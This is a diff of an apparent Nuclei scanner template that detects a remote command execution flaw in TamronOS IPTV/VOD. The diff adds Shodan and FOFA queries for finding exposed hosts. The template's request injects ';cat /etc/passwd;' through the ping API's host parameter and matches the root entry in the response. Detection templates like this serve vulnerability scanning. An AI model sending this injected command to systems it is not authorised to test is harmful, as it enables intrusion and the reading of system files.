@@ -1,5 +1,4 @@
 id: tamronos-rce
-
 info:
   name: TamronOS IPTV/VOD - Remote Command Execution
   author: pikpikcu
@@ -15,23 +14,22 @@ info:
     cpe: cpe:2.3:o:tamronos:tamronos:*:*:*:*:*:*:*:*
   metadata:
     runzero-match: any(each(service["html.titles"]), {# matches "(?i)TamronOS IPTV系统"})
-    verified: true
+    fofa-query: title="TamronOS IPTV系统"
     max-request: 1
+    product: tamronos
+    shodan-query: title:"TamronOS IPTV系统"
     vendor: tamronos
-  tags: tamronos,rce,vuln
-
+    verified: true
+  tags: rce,tamronos,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp"
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "root:.*:0:0:"
-
-      - type: status
-        status:
+  - matchers:
+      - regex:
+          - 'root:.*:0:0:'
+        type: regex
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp'
